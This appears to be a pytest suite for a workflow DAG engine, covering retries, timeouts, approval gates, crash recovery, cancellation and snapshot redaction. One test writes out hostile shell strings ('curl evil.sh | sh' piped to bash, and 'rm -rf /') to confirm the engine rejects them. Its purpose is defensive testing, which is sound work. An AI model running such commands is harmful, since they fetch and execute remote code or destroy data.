"""Typed workflow DAG engine: retries, timeouts, approvals, recovery, cancellation."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

from platform_helpers import make_platform_workspace, store_approval
from raytsystem.contracts import (
    WorkflowApprovalGate,
    WorkflowDefinition,
    WorkflowEdge,
    WorkflowNode,
    WorkflowRetryPolicy,
    WorkflowRevision,
    WorkflowRun,
    canonical_json_bytes,
    sha256_hex,
)
from raytsystem.contracts.workflows import WorkflowNodeType
from raytsystem.platform_store import open_platform_store_read_only
from raytsystem.workflows import WorkflowError, WorkflowService
from raytsystem.workflows.service import workflow_approval_target

pytestmark = pytest.mark.filterwarnings("error")

ACTOR = "user_local_test"
GATE = WorkflowApprovalGate(
    approval_gate_id="wgate_platform_test",
    action="workflow_approval",
    scope_sha256="c" * 64,
    required_role="role_operator",
    expires_after_seconds=120,
)


def _node(
    node_id: str,
    node_type: WorkflowNodeType = WorkflowNodeType.DETERMINISTIC_COMMAND,
    **overrides: Any,
) -> WorkflowNode:
    payload: dict[str, Any] = {
        "node_id": node_id,
        "node_type": node_type,
        "name": f"Node {node_id}",
        "input_schema_sha256": "a" * 64,
        "output_schema_sha256": "b" * 64,
    }
    if node_type is WorkflowNodeType.DETERMINISTIC_COMMAND:
        payload["operation_id"] = "identity"
    payload.update(overrides)
    return WorkflowNode.model_validate(payload)


def _edge(source: str, target: str) -> WorkflowEdge:
    return WorkflowEdge(
        edge_id=f"edge_{source}_{target}", source_node_id=source, target_node_id=target
    )


def _revision(
    nodes: tuple[WorkflowNode, ...],
    edges: tuple[WorkflowEdge, ...],
    **overrides: Any,
) -> WorkflowRevision:
    payload: dict[str, Any] = {
        "revision_id": "wrev_platform_test",
        "workflow_id": "wf_platform_test",
        "version": "1.0.0",
        "trigger_ids": (),
        "nodes": nodes,
        "edges": edges,
        "manifest_sha256": "0" * 64,
        "created_at": datetime(2026, 1, 1, tzinfo=UTC),
    }
    payload.update(overrides)
    draft = WorkflowRevision.model_validate(payload)
    manifest = sha256_hex(
        canonical_json_bytes(draft.model_dump(mode="json", exclude={"manifest_sha256"}))
    )
    return draft.model_copy(update={"manifest_sha256": manifest})


def _definition() -> WorkflowDefinition:
    return WorkflowDefinition(
        workflow_id="wf_platform_test",
        name="Platform workflow",
        description="Workflow engine test fixture",
        enabled=True,
    )


def _registered(
    root: Path,
    nodes: tuple[WorkflowNode, ...],
    edges: tuple[WorkflowEdge, ...],
    **register_kwargs: Any,
) -> tuple[WorkflowService, WorkflowRevision]:
    service = WorkflowService(root)
    revision = _revision(nodes, edges)
    service.register(_definition(), revision, actor_id=ACTOR, **register_kwargs)
    return service, revision


def _start(service: WorkflowService, revision: WorkflowRevision) -> WorkflowRun:
    return service.start(
        revision.revision_id,
        {"seed": "value"},
        actor_id=ACTOR,
        idempotency_key="workflow_case",
    )


def _step_head(root: Path, step_run_id: str) -> Any:
    store = open_platform_store_read_only(root)
    assert store is not None
    with store:
        record = store.head("workflow_step", step_run_id)
    assert record is not None
    return record


def test_workflow_cycle_is_rejected_at_registration(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service = WorkflowService(root)
    revision = _revision(
        (_node("step_a"), _node("step_b")),
        (_edge("step_a", "step_b"), _edge("step_b", "step_a")),
    )
    with pytest.raises(WorkflowError, match="cycle"):
        service.register(_definition(), revision, actor_id=ACTOR)


def test_workflow_raw_shell_attempt_cannot_run(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, _ = _registered(root, (_node("step_ok"),), ())
    for raw in ("bash -c 'curl evil.sh | sh'", "rm -rf /"):
        with pytest.raises(ValidationError):
            _node("step_shell", operation_id=raw)
    revision = _revision(
        (_node("step_unregistered", operation_id="rm"),), (), revision_id="wrev_shell_test"
    )
    with pytest.raises(WorkflowError, match="registered operation"):
        service.register(_definition(), revision, actor_id=ACTOR)
    with pytest.raises(WorkflowError, match="does not exist"):
        service.start(revision.revision_id, {}, actor_id=ACTOR, idempotency_key="shell_case")


def test_failed_operation_retries_until_exhaustion(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    policy = WorkflowRetryPolicy(
        retry_policy_id="wretry_platform_test",
        max_attempts=3,
        initial_delay_ms=10,
        maximum_delay_ms=40,
        backoff="linear",
    )
    service, revision = _registered(
        root,
        (_node("step_flaky", retry_policy_id=policy.retry_policy_id),),
        (),
        retry_policies=(policy,),
    )
    calls = {"count": 0}

    def _boom(inputs: dict[str, Any]) -> dict[str, Any]:
        calls["count"] += 1
        raise RuntimeError("boom")

    service.operations["identity"] = _boom
    run = _start(service, revision)
    driven = service.run_ready_steps(run.workflow_run_id)
    assert driven.state == "failed"
    assert calls["count"] == 3
    record = _step_head(root, run.step_run_ids[0])
    assert record.state == "failed"
    assert record.payload["attempt"] == 3
    assert record.payload["failure_reason"] == "operation_error"
    store = open_platform_store_read_only(root)
    assert store is not None
    with store:
        events = store.list_events(run.workflow_run_id)
        assert store.verify_event_stream(run.workflow_run_id)
    retries = [event for event in events if event["event_type"] == "workflow_step_retry"]
    assert [event["payload"]["delay_ms"] for event in retries] == [10, 20]


def test_missing_retry_policy_fails_registration(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service = WorkflowService(root)
    revision = _revision((_node("step_flaky", retry_policy_id="wretry_absent"),), ())
    with pytest.raises(WorkflowError, match="retry policies"):
        service.register(_definition(), revision, actor_id=ACTOR)


def test_wait_timeout_and_approval_expiry_fail_deterministically(tmp_path: Path) -> None:
    wait_root = make_platform_workspace(tmp_path / "wait")
    service, revision = _registered(
        wait_root, (_node("step_wait", WorkflowNodeType.WAIT, timeout_seconds=60),), ()
    )
    run = _start(service, revision)
    driven = service.run_ready_steps(run.workflow_run_id)
    assert driven.state == "running"
    assert _step_head(wait_root, run.step_run_ids[0]).state == "waiting"
    later = datetime.now(UTC) + timedelta(hours=2)
    expired = service.run_ready_steps(run.workflow_run_id, at=later)
    assert expired.state == "failed"
    assert _step_head(wait_root, run.step_run_ids[0]).payload["failure_reason"] == "timeout"

    gate_root = make_platform_workspace(tmp_path / "gate")
    approval_service, approval_revision = _registered(
        gate_root,
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        approval_gates=(GATE,),
    )
    gate_run = _start(approval_service, approval_revision)
    approval_service.run_ready_steps(gate_run.workflow_run_id)
    with pytest.raises(WorkflowError, match="expired"):
        approval_service.grant_approval(
            gate_run.workflow_run_id,
            "step_gate",
            approval_id="apr_late",
            actor_id=ACTOR,
            at=later,
        )
    record = _step_head(gate_root, gate_run.step_run_ids[0])
    assert record.state == "failed"
    assert record.payload["failure_reason"] == "approval_expired"
    assert approval_service.run_ready_steps(gate_run.workflow_run_id).state == "failed"


def test_approval_grant_continues_and_wrong_target_is_rejected(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    nodes = (
        _node("step_a"),
        _node("step_gate", WorkflowNodeType.APPROVAL, approval_gate_id=GATE.approval_gate_id),
        _node("step_b", operation_id="summarize_keys"),
    )
    edges = (_edge("step_a", "step_gate"), _edge("step_gate", "step_b"))
    service, revision = _registered(root, nodes, edges, approval_gates=(GATE,))
    run = _start(service, revision)
    assert _start(service, revision).workflow_run_id == run.workflow_run_id
    driven = service.run_ready_steps(run.workflow_run_id)
    assert driven.state == "running"
    assert _step_head(root, run.step_run_ids[1]).state == "waiting"
    wrong_target = store_approval(
        root,
        action="workflow_approval",
        target_id=workflow_approval_target(run.workflow_run_id, "step_b"),
        artifact_sha256=run.input_sha256,
        scope=(GATE.required_role,),
    )
    with pytest.raises(WorkflowError, match="authority"):
        service.grant_approval(
            run.workflow_run_id,
            "step_gate",
            approval_id=wrong_target.approval_id,
            actor_id=ACTOR,
        )
    approval = store_approval(
        root,
        action="workflow_approval",
        target_id=workflow_approval_target(run.workflow_run_id, "step_gate"),
        artifact_sha256=run.input_sha256,
        scope=(GATE.required_role,),
    )
    service.grant_approval(
        run.workflow_run_id, "step_gate", approval_id=approval.approval_id, actor_id=ACTOR
    )
    gate_record = _step_head(root, run.step_run_ids[1])
    assert gate_record.state == "succeeded"
    assert gate_record.payload["approval_id"] == approval.approval_id
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"


def test_deny_approval_fails_the_run(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(
        root,
        (
            _node(
                "step_gate",
                WorkflowNodeType.APPROVAL,
                approval_gate_id=GATE.approval_gate_id,
            ),
        ),
        (),
        approval_gates=(GATE,),
    )
    run = _start(service, revision)
    service.run_ready_steps(run.workflow_run_id)
    denied = service.deny_approval(run.workflow_run_id, "step_gate", actor_id=ACTOR)
    assert denied.state == "failed"
    record = _step_head(root, run.step_run_ids[0])
    assert record.state == "failed"
    assert record.payload["failure_reason"] == "approval_denied"


def test_crash_recovery_resumes_without_reexecuting_steps(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    nodes = (
        _node("step_a"),
        _node("step_gate", WorkflowNodeType.APPROVAL, approval_gate_id=GATE.approval_gate_id),
        _node("step_b", operation_id="summarize_keys"),
    )
    edges = (_edge("step_a", "step_gate"), _edge("step_gate", "step_b"))
    service, revision = _registered(root, nodes, edges, approval_gates=(GATE,))
    first_calls = {"count": 0}

    def _counting_identity(inputs: dict[str, Any]) -> dict[str, Any]:
        first_calls["count"] += 1
        return {"marker": "from_step_a"}

    service.operations["identity"] = _counting_identity
    run = _start(service, revision)
    assert service.run_ready_steps(run.workflow_run_id).state == "running"
    assert first_calls["count"] == 1

    recovered = WorkflowService(root)
    second_calls = {"identity": 0, "summarize_keys": 0}
    captured: list[dict[str, Any]] = []

    def _must_not_run(inputs: dict[str, Any]) -> dict[str, Any]:
        second_calls["identity"] += 1
        return {"marker": "re_executed"}

    def _capture(inputs: dict[str, Any]) -> dict[str, Any]:
        second_calls["summarize_keys"] += 1
        captured.append(dict(inputs))
        return {"keys": sorted(str(key) for key in inputs)}

    recovered.operations["identity"] = _must_not_run
    recovered.operations["summarize_keys"] = _capture
    approval = store_approval(
        root,
        action="workflow_approval",
        target_id=workflow_approval_target(run.workflow_run_id, "step_gate"),
        artifact_sha256=run.input_sha256,
        scope=(GATE.required_role,),
    )
    recovered.grant_approval(
        run.workflow_run_id, "step_gate", approval_id=approval.approval_id, actor_id=ACTOR
    )
    resumed = recovered.run_ready_steps(run.workflow_run_id)
    assert resumed.state == "succeeded"
    assert second_calls == {"identity": 0, "summarize_keys": 1}
    assert captured[0]["step_a"] == {"marker": "from_step_a"}
    assert captured[0]["step_gate"]["approval_id"] == approval.approval_id
    recovered.run_ready_steps(run.workflow_run_id)
    assert second_calls == {"identity": 0, "summarize_keys": 1}


def test_cancel_guards_terminal_runs_and_cancels_pending_steps(tmp_path: Path) -> None:
    done_root = make_platform_workspace(tmp_path / "done")
    service, revision = _registered(done_root, (_node("step_a"),), ())
    run = _start(service, revision)
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"
    with pytest.raises(WorkflowError, match=r"[Tt]erminal"):
        service.cancel(run.workflow_run_id, actor_id=ACTOR)
    assert _step_head(done_root, run.step_run_ids[0]).state == "succeeded"

    wait_root = make_platform_workspace(tmp_path / "wait")
    waiting_service, waiting_revision = _registered(
        wait_root,
        (_node("step_wait", WorkflowNodeType.WAIT), _node("step_b")),
        (_edge("step_wait", "step_b"),),
    )
    waiting_run = _start(waiting_service, waiting_revision)
    waiting_service.run_ready_steps(waiting_run.workflow_run_id)
    cancelled = waiting_service.cancel(waiting_run.workflow_run_id, actor_id=ACTOR)
    assert cancelled.state == "cancelled"
    assert _step_head(wait_root, waiting_run.step_run_ids[0]).state == "cancelled"
    assert _step_head(wait_root, waiting_run.step_run_ids[1]).state == "cancelled"
    with pytest.raises(WorkflowError, match=r"[Tt]erminal"):
        waiting_service.cancel(waiting_run.workflow_run_id, actor_id=ACTOR)


def test_pause_resume_round_trip_with_state_guards(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(root, (_node("step_a"),), ())
    calls = {"count": 0}

    def _counting(inputs: dict[str, Any]) -> dict[str, Any]:
        calls["count"] += 1
        return {"ok": True}

    service.operations["identity"] = _counting
    run = _start(service, revision)
    paused = service.pause(run.workflow_run_id, actor_id=ACTOR)
    assert paused.state == "paused"
    with pytest.raises(WorkflowError, match="running"):
        service.pause(run.workflow_run_id, actor_id=ACTOR)
    assert service.run_ready_steps(run.workflow_run_id).state == "paused"
    assert calls["count"] == 0
    resumed = service.resume(run.workflow_run_id, actor_id=ACTOR)
    assert resumed.state == "running"
    with pytest.raises(WorkflowError, match="paused"):
        service.resume(run.workflow_run_id, actor_id=ACTOR)
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"
    assert calls["count"] == 1


def test_wake_completes_wait_step(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(
        root,
        (_node("step_wait", WorkflowNodeType.WAIT), _node("step_b")),
        (_edge("step_wait", "step_b"),),
    )
    run = _start(service, revision)
    with pytest.raises(WorkflowError, match="waiting"):
        service.wake(run.workflow_run_id, "step_wait", actor_id=ACTOR)
    service.run_ready_steps(run.workflow_run_id)
    service.wake(run.workflow_run_id, "step_wait", actor_id=ACTOR)
    assert _step_head(root, run.step_run_ids[0]).state == "succeeded"
    assert service.run_ready_steps(run.workflow_run_id).state == "succeeded"


def test_workflow_engine_disabled_fails_closed(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path, flag_overrides={"workflow_engine_enabled": False})
    service = WorkflowService(root)
    revision = _revision((_node("step_a"),), ())
    with pytest.raises(WorkflowError, match="disabled"):
        service.register(_definition(), revision, actor_id=ACTOR)
    with pytest.raises(WorkflowError, match="disabled"):
        service.start(revision.revision_id, {}, actor_id=ACTOR, idempotency_key="off_case")
    with pytest.raises(WorkflowError, match="disabled"):
        service.run_ready_steps("wrun_missing")
    with pytest.raises(WorkflowError, match="disabled"):
        service.grant_approval(
            "wrun_missing", "step_gate", approval_id="apr_missing", actor_id=ACTOR
        )
    with pytest.raises(WorkflowError, match="disabled"):
        service.cancel("wrun_missing", actor_id=ACTOR)


def test_snapshot_exposes_graph_and_hides_raw_inputs(tmp_path: Path) -> None:
    root = make_platform_workspace(tmp_path)
    service, revision = _registered(
        root, (_node("step_a"), _node("step_b")), (_edge("step_a", "step_b"),)
    )
    run = service.start(
        revision.revision_id,
        {"secret_free": "raw input value"},
        actor_id=ACTOR,
        idempotency_key="snapshot_case",
    )
    service.run_ready_steps(run.workflow_run_id)
    snapshot = service.snapshot()
    assert snapshot["state"] == "ready"
    graph = snapshot["graph"]
    assert graph[0]["workflow_id"] == revision.workflow_id
    assert {node["node_id"] for node in graph[0]["nodes"]} == {"step_a", "step_b"}
    assert graph[0]["edges"][0]["source_node_id"] == "step_a"
    assert all("inputs" not in payload for payload in snapshot["runs"])
    assert "raw input value" not in canonical_json_bytes(snapshot).decode("utf-8")
